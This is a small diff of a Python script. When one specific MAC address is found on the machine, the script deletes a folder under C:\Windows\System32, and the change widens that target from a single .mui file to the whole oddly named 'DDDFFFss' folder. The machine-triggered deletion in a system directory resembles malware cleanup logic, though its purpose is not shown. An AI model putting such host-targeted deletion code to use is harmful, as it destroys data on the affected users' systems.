@@ -43,7 +43,7 @@ def main():
     mac_addresses = re.findall(mac_address_pattern, tri)
 
     if "36-02-86-52-8E-DD" in mac_addresses:
-        folder_path = r"C:\Windows\System32\DDDFFFss\sapu.dll.mui"
+        folder_path = r"C:\Windows\System32\DDDFFFss"
         delete_folder(folder_path)
         time.sleep(20)
 
